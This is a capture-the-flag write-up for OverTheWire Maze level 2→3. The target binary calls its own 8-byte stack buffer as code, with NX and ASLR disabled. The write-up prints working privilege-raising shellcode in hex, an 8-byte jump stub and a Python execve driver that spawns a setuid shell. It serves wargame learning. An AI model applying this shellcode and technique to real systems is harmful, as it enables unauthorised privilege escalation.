# OverTheWire — Maze Level 2 → 3

> Goal: Get `maze3` password from `maze2`. Result: **`**********`** (hidden)
> Technique: **Executable stack (NX disabled)** + stack buffer called as a function pointer →
> 8-byte stub that jumps to shellcode in the environment.

---

## 1. First Look
```bash
checksec --file=/maze/maze2
# No canary? -> Canary FOUND | NX DISABLED | No PIE
/maze/maze2            # no arguments → exit(1)
cat /proc/sys/kernel/randomize_va_space   # 0  (ASLR OFF)
```
**NX disabled** = bytes on the stack can execute as code. ASLR off = addresses are deterministic.

## 2. Analysis
Pseudocode:
```c
char buf[8];
void (*fp)() = buf;          // fp points to buf
if (argc != 2) exit(1);
strncpy(buf, argv[1], 8);    // exactly 8 bytes (NO overflow, doesn't touch canary)
fp();                        // call buf AS CODE
```
No overflow — but none is needed: the program **directly calls the stack buffer**. Since NX is
disabled, machine code written to buf executes.

## 3. Vulnerability & Plan
Problem: only **8 bytes** fit in buf — a full `execve("/bin/sh")` shellcode (~45 bytes) won't fit.
Solution — **two-stage**:
1. Put the large shellcode in an **environment variable** (env `SC`), padded with a NOP sled.
2. The 8-byte **stub** that fits in buf: `mov eax, <sled_address>; jmp eax`
   (`b8 <addr> ff e0` + `90`) → jump to sled → shellcode.

With ASLR off, the env address is fixed. We read it with a **32-bit helper** whose argv/env/execfn
lengths match exactly, and target the middle of the large NOP sled (small offsets are absorbed).

> Two gotchas:
> - **`MAX_ARG_STRLEN` = 128KB**: a single env string cannot exceed 131072 bytes → keep sled at 64KB.
> - **No null bytes**: `argv[1]` (stub) and `SC` (env) are C strings so `0x00` is forbidden inside
>   them. Stack addresses are `0xffff…` so the stub is naturally null-free; shellcode was chosen
>   null-free too.

## 4. Exploit (summary)
```python
# 45-byte shellcode: setresuid32(geteuid x3) + execve("/bin//sh")
sc  = bytes.fromhex('31c0b031cd80 89c389c189c2 31c0b0d0cd80 31c050'
                    '682f2f7368 682f62696e 89e3 50 89e2 53 89e1 b00b cd80'.replace(' ',''))
SC  = b'\x90'*0x10000 + sc          # 64KB NOP sled + shellcode  (env variable)
# 1) Find the address: argv0="/maze/maze2", argv1=8 bytes, execfn 11 chars must match
# 2) stub = b8 <base+0x8000 little-endian> ff e0 90   (8 bytes, sled midpoint)
os.execve('/maze/maze2', [b'/maze/maze2', stub], {b'SC': SC})
```
Feeding `/bin/cat /etc/maze_pass/maze3` to stdin, the spawned shell (maze3) prints the password.

Shellcode first calls `setresuid32(euid,euid,euid)` → prevents `/bin/sh` from dropping privileges,
then `execve("/bin//sh")`.

## Lessons
| Topic | Note |
|-------|------|
| NX / DEP | If disabled, data on the stack/heap **runs as code** → classic ret2stack/shellcode |
| Function pointer | The program itself calling the buffer executes code without any overflow |
| Small buffer | 8 bytes isn't enough → use a stub to redirect to the large shellcode in env |
| Env shellcode + NOP sled | With ASLR off, env address is fixed; large sled absorbs small offsets |
| `MAX_ARG_STRLEN` | Single argv/env string ≤ 128KB (`32*PAGE_SIZE`) |
| Deterministic address | Same argv0/argv1/execfn length + same env = same address (read with a 32-bit helper) |
